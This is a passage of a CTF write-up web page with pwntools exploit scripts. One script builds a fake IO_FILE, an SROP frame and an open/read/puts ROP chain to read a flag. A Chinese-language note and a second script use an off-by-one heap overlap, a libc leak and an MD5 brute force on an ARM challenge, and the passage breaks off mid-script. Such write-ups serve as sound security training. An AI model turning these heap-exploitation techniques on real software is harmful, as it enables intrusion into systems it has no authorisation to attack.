</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span> <span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_list_all&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x20</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>free_hook_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>	<span class=n>gadget</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x14a0a0</span>
</span></span><span class=line><span class=cl>	<span class=n>_IO_str_jumps</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x1e2560</span>
</span></span><span class=line><span class=cl>	<span class=n>srop_address</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x360</span>
</span></span><span class=line><span class=cl>	<span class=n>FAKE_IO</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x7b0</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>IO</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xffff</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>FAKE_IO</span> <span class=o>+</span> <span class=mh>0xe0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>FAKE_IO</span> <span class=o>+</span> <span class=mh>0xf8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>IO</span> <span class=o>=</span> <span class=n>IO</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xc8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>_IO_str_jumps</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>srop_address</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>gadget</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xff</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>IO</span><span class=p>),</span> <span class=mh>0x10</span><span class=p>)</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x7c0</span> <span class=o>+</span> <span class=n>i</span><span class=p>));</span> <span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span> <span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>IO</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mh>0x10</span><span class=p>])</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>pop_rdi_ret</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x121b1d</span><span class=p>;</span> <span class=n>pop_rsi_ret</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x2a4cf</span><span class=p>;</span> <span class=n>pop_rdx_ret</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0xc7f32</span>
</span></span><span class=line><span class=cl>	<span class=n>orw_rop</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;./flag</span><span class=se>\x00\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>free_hook_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>free_hook_addr</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x50</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>free_hook_addr</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>();</span> <span class=n>frame</span><span class=o>.</span><span class=n>rsp</span> <span class=o>=</span> <span class=n>free_hook_addr</span> <span class=o>+</span> <span class=mi>8</span><span class=p>;</span> <span class=n>frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=n>free_hook_addr</span><span class=p>;</span> <span class=n>frame</span><span class=o>.</span><span class=n>rdx</span> <span class=o>=</span> <span class=mh>0x100</span><span class=p>;</span> <span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mh>0x20</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;setcontext&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>61</span><span class=p>)</span> <span class=o>+</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>frame</span><span class=p>)[</span><span class=mh>0x28</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=mh>0x10</span><span class=p>)</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x360</span> <span class=o>+</span> <span class=n>i</span><span class=p>));</span> <span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span> <span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>payload</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mh>0x10</span><span class=p>])</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x20</span><span class=p>));</span> <span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span> <span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xffff</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0xd0</span><span class=p>));</span> <span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span> <span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]));</span> <span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>orw_rop</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=arm_protocol>arm_protocol</h3><p>绕过md5后是一个菜单，分别有add，show，delete,edit选项，在edit时有off by one，利用off by one可以制造一个heap overlab，再任意地址申请到got表上泄漏libc，最后把puts指针改为system。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#/usr/bin/env python</span>
</span></span><span class=line><span class=cl><span class=c1>#-*-coding:utf-8-*-</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>signal</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>proc</span><span class=o>=</span><span class=s2>&#34;./arm_protocol&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=n>proc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>passcheck</span><span class=p>(</span><span class=n>hash_value</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>answer</span> <span class=o>=</span> <span class=s1>&#39;A&#39;</span>
</span></span><span class=line><span class=cl>		<span class=n>answer</span> <span class=o>+=</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl>		<span class=n>md5</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>()</span>
</span></span><span class=line><span class=cl>		<span class=n>md5</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>answer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>hashresult</span> <span class=o>=</span> <span class=n>md5</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=n>hashresult</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>hash_value</span><span class=p>):</span>
</span></span><span class=line><span class=cl>			<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;hash :&#34;</span><span class=o>+</span><span class=n>hashresult</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;answer: &#34;</span> <span class=o>+</span><span class=n>answer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span> <span class=n>answer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>fix</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=n>choose</span><span class=p>,</span><span class=n>add</span><span class=p>,</span> <span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>msg</span> <span class=o>=</span> <span class=n>msg</span><span class=o>.</span><span class=n>ljust</span><span class=p>((</span><span class=mh>0x4b</span><span class=o>-</span><span class=mh>0x10</span><span class=o>-</span><span class=mh>0x3</span><span class=p>),</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>header</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x11451400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p8_12</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>add</span><span class=p>)</span> <span class=c1># Add</span>
</span></span><span class=line><span class=cl>	<span class=n>p12_16</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>int_p4_8</span> <span class=o>=</span> <span class=n>add</span> <span class=o>^</span> <span class=n>idx</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>msg</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>int_p4_8</span> <span class=o>^=</span> <span class=nb>ord</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p4_8</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>int_p4_8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;p4_8 :&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>int_p4_8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>header</span> <span class=o>+</span> <span class=n>p4_8</span> <span class=o>+</span> <span class=n>p8_12</span> <span class=o>+</span> <span class=n>p12_16</span> <span class=o>+</span> <span class=n>msg</span> <span class=o>+</span><span class=n>choose</span>
</span></span><span class=line><span class=cl>	<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;length of payload :&#34;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>	<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;payload[0x8] Add:&#34;</span><span class=o>+</span><span class=n>payload</span><span class=p>[</span><span class=mh>0x8</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;payload[0x48] Delete :&#34;</span><span class=o>+</span><span class=n>payload</span><span class=p>[</span><span class=mh>0x48</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;payload[0x49] Show :&#34;</span><span class=o>+</span><span class=n>payload</span><span class=p>[</span><span class=mh>0x49</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;payload[0x4a] Edit:&#34;</span><span class=o>+</span><span class=n>payload</span><span class=p>[</span><span class=mh>0x4a</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 48</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>Delete</span><span class=p>():</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>p8</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 49</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>Show</span><span class=p>():</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 4A</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>Edit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pwn</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span><span class=n>port</span><span class=p>,</span><span class=n>debug</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=k>global</span> <span class=n>sh</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=n>debug</span><span class=o>==</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>context</span><span class=o>.</span><span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span>
</span></span><span class=line><span class=cl>		<span class=n>sh</span><span class=o>=</span><span class=n>process</span><span class=p>([</span><span class=s2>&#34;qemu-arm&#34;</span><span class=p>,</span><span class=s2>&#34;-L&#34;</span><span class=p>,</span><span class=s2>&#34;/usr/arm-linux-gnueabi&#34;</span><span class=p>,</span><span class=n>proc</span><span class=p>])</span>
</span></span><span class=line><span class=cl>		<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;/usr/arm-linux-gnueabi/lib/libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>elif</span> <span class=n>debug</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>context</span><span class=o>.</span><span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span>
</span></span><span class=line><span class=cl>		<span class=n>sh</span><span class=o>=</span><span class=n>process</span><span class=p>([</span><span class=s2>&#34;qemu-arm&#34;</span><span class=p>,</span><span class=s2>&#34;-L&#34;</span><span class=p>,</span><span class=s2>&#34;/usr/arm-linux-gnueabi&#34;</span><span class=p>,</span><span class=s2>&#34;-g&#34;</span><span class=p>,</span><span class=s2>&#34;1234&#34;</span><span class=p>,</span><span class=n>proc</span><span class=p>])</span>
</span></span><span class=line><span class=cl>		<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;/usr/arm-linux-gnueabi/lib/libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>context</span><span class=o>.</span><span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span>
</span></span><span class=line><span class=cl>		<span class=n>sh</span><span class=o>=</span><span class=n>remote</span><span class=p>(</span><span class=s2>&#34;192.168.1.104&#34;</span><span class=p>,</span><span class=mi>8888</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc-2.27.so&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1># add 10</span>
</span></span><span class=line><span class=cl>	<span class=n>md5_check</span> <span class=o>=</span> <span class=n>passcheck</span><span class=p>(</span><span class=s2>&#34;4d8900&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>			<span class=c1># md5_check = &#34;ReStr0&#34;</span>
</span></span><span class=line><span class=cl>		<span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;AAAAA&#34;</span>
</span></span><span class=line><span class=cl>		<span class=n>payload</span> <span class=o>=</span> <span class=n>fix</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=n>Show</span><span class=p>(),</span><span class=mh>0x10</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>md5_check</span>
</span></span><span class=line><span class=cl>		<span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Input code&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1># off by one</span>
</span></span><span class=line><span class=cl>	<span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x20</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\x41</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>fix</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=n>Edit</span><span class=p>(),</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>md5_check</span>
